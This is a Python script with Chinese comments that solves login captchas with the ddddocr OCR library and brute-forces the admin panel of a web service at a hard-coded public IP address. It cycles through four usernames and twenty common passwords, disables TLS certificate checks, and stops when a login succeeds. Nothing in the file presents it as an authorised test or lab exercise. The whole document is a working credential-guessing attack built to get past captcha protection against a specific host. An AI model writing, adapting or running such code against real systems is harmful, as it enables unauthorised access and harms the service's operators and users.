#!/usr/bin/env python3
"""ddddocr识别验证码+登录"""
import urllib.request, http.cookiejar, ssl, sys, time, json
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"

ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha():
    r = op.open(f"{B}/customer/admin/verify.html", timeout=8)
    return r.read()

def login(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=8)
        return json.loads(r.read().decode("utf-8","ignore"))
    except Exception as e:
        return {"status":-1,"msg":str(e)[:60]}

# 先测识别率
ok = 0
for i in range(20):
    cap = get_captcha()
    try:
        code = ocr.classification(cap)
        if len(code) == 4: ok += 1
    except:
        pass
print(f"识别率测试: {ok}/20 (4位)", flush=True)

users = ["admin","zhilian","zyadmin","kefu"]
passwords = ["admin123","123456","admin","admin888","12345678","admin666","admin@123",
             "kefu123","zy_kefu","kefu888","123123","admin2024","admin2025","admin2026",
             "zhilian","zhilian123","zy123456","a123456","Aa123456","abc123"]

for i in range(300):
    cap = get_captcha()
    try:
        code = ocr.classification(cap)
    except Exception as e:
        print(f"[{i}] OCR ERR {str(e)[:40]}", flush=True)
        continue
    if len(code) != 4:
        print(f"[{i}] code={code}({len(code)}位)", flush=True)
        continue
    for user in users:
        for pw in passwords:
            r = login(user, pw, code)
            msg = str(r.get("msg",""))
            if r.get("status") == 1:
                print(f"!!! 登录成功 {user}/{pw} code={code}", flush=True)
                sys.exit(0)
            elif "验证码" in msg:
                break  # 验证码错了,换下一个验证码
            elif "密码" in msg or "账号" in msg or "不存在" in msg:
                pass  # 验证码对了密码错,继续试其他密码
            else:
                print(f"[{i}] code={code} {user}/{pw} -> {r}", flush=True)
    if i % 50 == 0:
        print(f"[{i}] 进行中", flush=True)
    time.sleep(0.2)
print("DONE")
